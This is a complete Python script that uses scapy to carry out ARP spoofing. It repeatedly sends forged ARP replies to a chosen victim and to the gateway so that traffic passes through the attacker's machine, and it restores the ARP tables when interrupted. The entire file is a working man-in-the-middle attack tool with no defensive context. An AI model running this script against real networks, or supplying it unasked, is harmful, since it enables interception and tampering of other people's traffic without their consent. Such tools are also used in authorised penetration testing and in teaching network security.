#!/usr/bin/python3

import scapy.all as scapy
import time
import argparse


def get_args():
    """
    Get command-line arguments.
    :return: Object containing user-specified arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='ARP spoof victim', required=True)
    parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP', required=True)
    parser.add_argument('-n', dest='frequency', help='Number of seconds to wait before retrying the spoof operation', required=True)
    options = parser.parse_args()

    return options


def spoof(target_ip, spoof_ip):
    """
    Spoof the ARP by sending forged packets.
    :param target_ip: IP of the target
    :param spoof_ip: Spoofed IP
    """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    Restore the ARP by sending proper packets.
    :param destination_ip: IP of the destination
    :param source_ip: IP of the source
    """
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


args = get_args()
target_ip = args.target
gateway_ip = args.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[*] Packets sent: " + str(sent_packets_count), end="")
        if args.frequency:
            n = int(args.frequency)
        else:
            n = 2
        time.sleep(n)

except KeyboardInterrupt:
    print("\nCtrl + C pressed. Exiting...")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] ARP spoof stopped")
